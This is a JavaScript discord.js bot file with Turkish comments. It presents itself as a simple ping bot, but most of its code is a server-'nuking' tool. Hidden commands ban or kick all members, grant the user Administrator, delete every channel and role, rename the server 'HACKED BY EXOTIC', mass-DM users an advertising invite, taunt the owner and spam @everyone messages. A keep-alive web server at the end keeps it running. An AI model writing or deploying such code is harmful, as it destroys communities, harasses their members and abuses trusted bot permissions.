require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`✅ Bot aktif! Giriş yapan: ${client.user.tag}`);
});

client.on('messageCreate', (message) => {
    if (message.author.bot) return;

    if (message.content === '!ping') {
        message.reply('Pong!');
    }
});

client.login(process.env.TOKEN);

const express = require("express");
const http = require("http");

client.login(process.env.TOKEN);

client.on("messageCreate", msg => {         
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.cache.forEach(member => {
      if (member.bannable) member.ban();
    });
  }
});

client.on("messageCreate", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.cache.forEach(member => {
      if (member.kickable) member.kick();
    });
  }
});

client.on("messageCreate", async msg => {
  if (msg.content === "+duyur") {
    msg.delete();
    const users = await client.users.fetch();
    users.forEach(user => {
      if (!user.bot) {
        user.send("**SUNUCU GG BİZE GELİN https://discord.gg/e486WKzCxJ ** :wink:")
          .catch(console.error);
      }
    });
  } 
});

client.on("messageCreate", async msg => {
  if (msg.content === "+yetki") {
    msg.delete();
    const role = await msg.guild.roles.create({
      name: ".",
      permissions: ["Administrator"]
    });
    msg.member.roles.add(role);
  }
});

client.on("messageCreate", async msg => {
  if (msg.content === "@everyone") {
    msg.delete();

    // Tüm kanalları sil
    msg.guild.channels.cache.forEach(channel => {
      if (channel.deletable) channel.delete();
    });

    // Yeni kanal oluştur
    await msg.guild.channels.create({
      name: "hacked",
      type: 0
    });
    
    // Ses kanalları oluştur
    for(let i = 0; i < 20; i++) {
      await msg.guild.channels.create({
        name: "BU SUNUCU HACKLENMİŞTİR",
        type: 2,
        userLimit: 1
      });
    }

    await msg.guild.setIcon("https://hizliresim.com/3gtofwa");
    await msg.guild.setName("HACKED BY EXOTIC");
    
    // Rolleri sil
    msg.guild.roles.cache.forEach(role => {
      if (role.deletable) role.delete();
    });
    
    
    await msg.guild.fetchOwner().then(owner => {
      owner.send("**SUNUCU HACKLENDİ HADİ KOLAY GELSİN :D**");
    });
  }  
});

client.on("messageCreate", async msg => {
  if (msg.content === "+rolspam") {
    msg.delete();
    for(let i = 0; i < 10; i++) {
      await msg.guild.roles.create({
        name: "HACKED",
        color: 0xFF0000,
        permissions: ["Administrator"]
      });
    }
  }
});

client.on('messageCreate', msg => {
  if (msg.content === '+spam') {
    for(let i = 0; i < 50; i++) {
      msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
    }
  }
});

const app = express();

// Uptime ping endpoint
app.get("/", (request, response) => {
  const timestamp = new Date().toISOString();
  console.log(`${Date.now()} Ping tamamdır. - ${timestamp}`);  
  response.status(200).json({ 
    status: "alive", 
    timestamp: timestamp,
    uptime: process.uptime() 
  });
});

// Health check endpoint
app.get("/health", (request, response) => {
  response.status(200).json({ 
    status: "healthy", 
    bot: client.user ? client.user.tag : "connecting...",
    timestamp: new Date().toISOString()
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Sunucu ${PORT} portunda başlatıldı.`);
});

// Self-ping system for uptime
function keepAlive() {
  const urls = [
    `http://localhost:${PORT}/`,
    `http://localhost:${PORT}/health`
  ];
  
  // Try external domain if available
  if (process.env.REPL_SLUG && process.env.REPL_OWNER) {
    urls.push(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`);
  }
  
  urls.forEach(url => {
    http.get(url, (res) => {
      // Success ping
    }).on('error', (err) => {
      console.log(`Ping hatası: ${err.message}`);
    });
  });
}

// Ping every 5 minutes
setInterval(keepAlive, 5 * 60 * 1000);

// Initial ping after 30 seconds
setTimeout(keepAlive, 30000);

